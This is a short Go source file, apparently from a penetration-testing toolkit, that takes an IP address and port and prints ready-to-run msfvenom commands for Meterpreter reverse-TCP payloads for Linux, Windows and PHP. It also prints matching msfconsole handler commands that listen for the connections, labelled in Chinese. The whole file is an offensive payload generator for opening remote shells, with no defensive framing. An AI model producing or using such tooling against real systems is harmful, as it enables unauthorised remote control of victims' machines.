package rcepay

import (
	"fmt"
	"os"
	"regexp"
	"strconv"
)

var msflinux string = `
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=%v LPORT=%v -f elf > shell.elf`
var linuxlinsen string = `
msfconsole -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost %v; set lport %v; run"
`
var msfWindows string = `
msfvenom -p windows/meterpreter/reverse_tcp LHOST=%v LPORT=%v -f exe -o 123.exe`
var Windowslinsen string = `
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost %v; set lport %v; run"
`
var msfPHP string = `
msfvenom -p php/meterpreter_reverse_tcp LHOST=%v LPORT=%v -f raw > shell.php`
var PHPlinsen string = `
msfconsole -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set lhost %v; set lport %v; run"
`

func MsfSwitch(msf string) {
	IpAndPort(msf)
}

func IpAndPort(ip string) {
	re, err := regexp.Compile("^\\d*.\\d*.\\d*.\\d*")
	report, err := regexp.Compile("([0-9]|[1-9]\\d{1,3}|[1-5]\\d{4}|6[0-4]\\d{4}|65[0-4]\\d{2}|655[0-2]\\d|6553[0-5])$")
	if err == nil {
		found2 := report.FindString(ip)
		num1, _ := strconv.Atoi(found2)
		checkPort(num1)
		found := re.FindString(ip)
		fmt.Printf("\033[1;31;40mLinux\033[0m"+msflinux+"\n\033[1;31;40mLinux监听\033[0m"+linuxlinsen+"\n", found, num1, found, num1)
		fmt.Printf("\033[1;31;40mWindows\033[0m"+msfWindows+"\n\033[1;31;40mWindows监听\033[0m"+Windowslinsen+"\n", found, num1, found, num1)
		fmt.Printf("\033[1;31;40mPHP\033[0m"+msfPHP+"\n\033[1;31;40mPHP监听\033[0m"+PHPlinsen+"\n", found, num1, found, num1)

	}

}

func checkPort(port int) int {
	if port > 65535 {
		fmt.Println("端口错误")
		os.Exit(0)
	}
	return port
}
